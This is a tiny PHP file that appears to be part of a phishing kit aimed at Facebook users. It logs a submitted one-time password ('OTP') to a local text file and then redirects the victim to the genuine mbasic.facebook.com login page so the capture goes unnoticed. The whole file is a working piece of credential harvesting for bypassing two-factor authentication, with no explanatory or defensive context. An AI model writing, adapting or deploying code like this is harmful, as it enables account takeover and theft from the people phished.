<?php

file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Fgroups%2F715867521849002%2F&email=&li=BQx8XzCTAfQj3Yp1qunihUZt&e=1348092&shbl=1&refsrc=https%3A%2F%2Fmbasic.facebook.com%2Fgroups%2F715867521849002%2F&_rdr');
exit();
